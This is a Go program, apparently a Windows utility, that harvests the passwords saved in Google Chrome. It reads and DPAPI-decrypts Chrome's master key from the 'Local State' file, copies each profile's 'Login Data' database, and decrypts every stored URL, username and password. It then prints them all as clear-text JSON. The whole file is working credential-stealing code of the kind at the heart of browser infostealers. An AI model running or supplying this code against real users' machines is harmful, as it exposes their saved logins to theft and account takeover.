package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"syscall"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

var crypt32DLL = syscall.NewLazyDLL("crypt32.dll")
var kernel32DLL = syscall.NewLazyDLL("kernel32.dll")
var cryptUnprotectDataProc = crypt32DLL.NewProc("CryptUnprotectData")
var localFreeProc = kernel32DLL.NewProc("LocalFree")

// DPAPI

type DataBlob struct {
	Size uint32
	Data *byte
}

func NewBlob(data []byte) *DataBlob {
	if len(data) == 0 {
		return &DataBlob{}
	}
	return &DataBlob{Data: &data[0], Size: uint32(len(data))}
}

func (blob *DataBlob) Bytes() []byte {
	data := make([]byte, blob.Size)
	copy(data, unsafe.Slice(blob.Data, blob.Size))
	return data
}

func dpapiDecrypt(data []byte) ([]byte, error) {
	var dataBlob DataBlob
	r, _, err := cryptUnprotectDataProc.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&dataBlob)))
	if r == 0 {
		return nil, err
	}
	defer localFreeProc.Call(uintptr(unsafe.Pointer(dataBlob.Data)))
	return dataBlob.Bytes(), nil
}

// Utils

var profileDirRegexp = regexp.MustCompile(`^Profile*|^Default$`)

func copyFile(src, dst string) error {
	file, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	err = os.WriteFile(dst, file, 0644)
	if err != nil {
		return err
	}
	return nil
}

func getUserDataPath() (string, error) {
	homePath, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(homePath, "AppData", "Local", "Google", "Chrome", "User Data"), nil
}

func getLocalStatePath() (string, error) {
	userDataPath, err := getUserDataPath()
	if err != nil {
		return "", err
	}
	return filepath.Join(userDataPath, "Local State"), nil
}

func getLoginDataPaths() ([]string, error) {
	var paths []string
	userDataPath, err := getUserDataPath()
	if err != nil {
		return nil, err
	}
	files, err := os.ReadDir(userDataPath)
	if err != nil {
		return nil, err
	}
	for _, file := range files {
		if file.IsDir() && profileDirRegexp.MatchString(file.Name()) {
			filePath := filepath.Join(userDataPath, file.Name(), "Login Data")
			if _, err := os.Stat(filePath); err == nil {
				paths = append(paths, filePath)
			}
		}
	}
	return paths, nil
}

// Passoword decrypt

type Password struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
}

func getMasterKey() ([]byte, error) {
	localStatePath, err := getLocalStatePath()
	if err != nil {
		return nil, err
	}
	jsonFile, err := os.Open(localStatePath)
	if err != nil {
		return nil, err
	}
	defer jsonFile.Close()
	jsonBytes, err := io.ReadAll(jsonFile)
	if err != nil {
		return nil, err
	}
	var result map[string]map[string]string
	json.Unmarshal(jsonBytes, &result)
	base64CryptedMasterKey := result["os_crypt"]["encrypted_key"]
	cryptedMasterKey := make([]byte, base64.StdEncoding.EncodedLen(len(base64CryptedMasterKey)))
	_, err = base64.StdEncoding.Decode(cryptedMasterKey, []byte(base64CryptedMasterKey))
	if err != nil {
		return nil, err
	}
	return dpapiDecrypt(cryptedMasterKey[5:]) // Remove "DPAPI" suffix
}

func decryptPassword(masterKey, encryptedPassword []byte) (string, error) {
	prefix, cipherText := string(encryptedPassword[:3]), encryptedPassword[3:]
	if prefix == "v10" { // Google Chrome version 80 or higher
		block, err := aes.NewCipher(masterKey)
		if err != nil {
			return "", err
		}
		aesgcm, err := cipher.NewGCM(block)
		if err != nil {
			return "", err
		}
		nonceSize := aesgcm.NonceSize()
		nonce, cipherText := cipherText[:nonceSize], cipherText[nonceSize:]
		password, err := aesgcm.Open(nil, nonce, cipherText, nil)
		if err != nil {
			return "", err
		}
		return string(password), nil
	} else { // Google Chrome version < 80
		password, err := dpapiDecrypt(encryptedPassword)
		if err != nil {
			return "", err
		}
		return string(password), nil
	}
}

// Start

func main() {
	var passwords []Password

	masterKey, err := getMasterKey()
	if err != nil {
		log.Fatal(err)
	}

	loginDataPaths, err := getLoginDataPaths()
	if err != nil {
		log.Fatal(err)
	}

	for _, loginDataPath := range loginDataPaths {
		// Copy database to avoid "database is locked" error
		dbFileName := "db.sqlite"
		err := copyFile(loginDataPath, dbFileName)
		if err != nil {
			log.Fatal(err)
		}
		defer os.Remove(dbFileName)

		// Connect to the database
		db, err := sql.Open("sqlite3", dbFileName)
		if err != nil {
			log.Fatal(err)
		}
		defer db.Close()

		// Extract urls, usernames and encrypted passwords
		rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
		if err != nil {
			log.Fatal(err)
		}
		defer rows.Close()

		// Loop over records
		for rows.Next() {
			var password Password
			var encryptedPassword []byte
			err := rows.Scan(&password.URL, &password.Username, &encryptedPassword)
			if err != nil {
				log.Fatal(err)
			}
			password.Password, err = decryptPassword(masterKey, encryptedPassword)
			if err != nil {
				log.Fatal(err)
			}
			passwords = append(passwords, password)
		}
		if err := rows.Err(); err != nil {
			log.Fatal(err)
		}
	}

	// Print json with all clear passwords
	json, err := json.Marshal(passwords)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(string(json))
}
